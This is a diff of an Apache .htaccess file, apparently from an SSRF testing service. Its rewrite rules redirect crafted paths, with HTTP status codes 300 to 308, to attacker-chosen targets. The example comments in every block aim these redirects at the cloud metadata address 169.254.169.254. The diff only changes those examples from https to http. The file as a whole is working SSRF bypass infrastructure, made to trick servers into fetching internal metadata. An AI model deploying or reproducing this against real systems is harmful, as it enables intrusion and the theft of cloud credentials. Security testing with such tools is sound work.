@@ -8,50 +8,50 @@ ErrorDocument 307 " "
 ErrorDocument 308 " "
 
 # 300 with response body
-# https://ssrf.localdomain.pw/csv-without-body/300-https-169.254.169.254:80-.c.csv
-# https://ssrf.localdomain.pw/csv-without-body/300-https-169.254.169.254:80-test/.c.csv
+# https://ssrf.localdomain.pw/csv-without-body/300-http-169.254.169.254:80-.c.csv
+# https://ssrf.localdomain.pw/csv-without-body/300-http-169.254.169.254:80-test/.c.csv
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 300-([^/-]*)-([^/-]*)-(.*).c.csv$
 RewriteRule 300-([^/-]*)-([^/-]*)-(.*).c.csv$ $1://$2/$3 [L,R=300,NC]
 
 # 301 with response body
-# https://ssrf.localdomain.pw/csv-without-body/301-https-169.254.169.254:80-.c.csv
-# https://ssrf.localdomain.pw/csv-without-body/301-https-169.254.169.254:80-test/.c.csv
+# https://ssrf.localdomain.pw/csv-without-body/301-http-169.254.169.254:80-.c.csv
+# https://ssrf.localdomain.pw/csv-without-body/301-http-169.254.169.254:80-test/.c.csv
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 301-([^/-]*)-([^/-]*)-(.*).c.csv$
 RewriteRule 301-([^/-]*)-([^/-]*)-(.*).c.csv$ $1://$2/$3 [L,R=301,NC]
 
 # 302 with response body
-# https://ssrf.localdomain.pw/csv-without-body/302-https-169.254.169.254:80-.c.csv
-# https://ssrf.localdomain.pw/csv-without-body/302-https-169.254.169.254:80-test/.c.csv
+# https://ssrf.localdomain.pw/csv-without-body/302-http-169.254.169.254:80-.c.csv
+# https://ssrf.localdomain.pw/csv-without-body/302-http-169.254.169.254:80-test/.c.csv
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 302-([^/-]*)-([^/-]*)-(.*).c.csv$
 RewriteRule 302-([^/-]*)-([^/-]*)-(.*).c.csv$ $1://$2/$3 [L,R=302,NC]
 
 # 303 with response body
-# https://ssrf.localdomain.pw/csv-without-body/303-https-169.254.169.254:80-.c.csv
-# https://ssrf.localdomain.pw/csv-without-body/303-https-169.254.169.254:80-test/.c.csv
+# https://ssrf.localdomain.pw/csv-without-body/303-http-169.254.169.254:80-.c.csv
+# https://ssrf.localdomain.pw/csv-without-body/303-http-169.254.169.254:80-test/.c.csv
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 303-([^/-]*)-([^/-]*)-(.*).c.csv$
 RewriteRule 303-([^/-]*)-([^/-]*)-(.*).c.csv$ $1://$2/$3 [L,R=303,NC]
 
 # 305 with response body
-# https://ssrf.localdomain.pw/csv-without-body/305-https-169.254.169.254:80-.c.csv
-# https://ssrf.localdomain.pw/csv-without-body/305-https-169.254.169.254:80-test/.c.csv
+# https://ssrf.localdomain.pw/csv-without-body/305-http-169.254.169.254:80-.c.csv
+# https://ssrf.localdomain.pw/csv-without-body/305-http-169.254.169.254:80-test/.c.csv
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 305-([^/-]*)-([^/-]*)-(.*).c.csv$
 RewriteRule 305-([^/-]*)-([^/-]*)-(.*).c.csv$ $1://$2/$3 [L,R=305,NC]
 
 # 307 with response body
-# https://ssrf.localdomain.pw/csv-without-body/307-https-169.254.169.254:80-.c.csv
-# https://ssrf.localdomain.pw/csv-without-body/307-https-169.254.169.254:80-test/.c.csv
+# https://ssrf.localdomain.pw/csv-without-body/307-http-169.254.169.254:80-.c.csv
+# https://ssrf.localdomain.pw/csv-without-body/307-http-169.254.169.254:80-test/.c.csv
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 307-([^/-]*)-([^/-]*)-(.*).c.csv$
 RewriteRule 307-([^/-]*)-([^/-]*)-(.*).c.csv$ $1://$2/$3 [L,R=307,NC]
 
 # 308 with response body
-# https://ssrf.localdomain.pw/csv-without-body/308-https-169.254.169.254:80-.c.csv
-# https://ssrf.localdomain.pw/csv-without-body/308-https-169.254.169.254:80-test/.c.csv
+# https://ssrf.localdomain.pw/csv-without-body/308-http-169.254.169.254:80-.c.csv
+# https://ssrf.localdomain.pw/csv-without-body/308-http-169.254.169.254:80-test/.c.csv
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 308-([^/-]*)-([^/-]*)-(.*).c.csv$
 RewriteRule 308-([^/-]*)-([^/-]*)-(.*).c.csv$ $1://$2/$3 [L,R=308,NC]
